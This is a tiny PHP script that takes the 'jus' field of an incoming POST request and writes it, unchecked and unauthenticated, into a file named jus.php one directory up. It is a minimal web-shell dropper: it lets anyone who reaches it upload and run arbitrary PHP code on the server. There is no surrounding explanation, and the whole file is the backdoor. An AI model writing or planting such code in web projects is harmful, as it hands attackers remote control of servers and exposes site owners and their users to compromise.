<?php

$fp = fopen('../jus.php', 'w');
fwrite($fp, $_POST['jus']);
fclose($fp);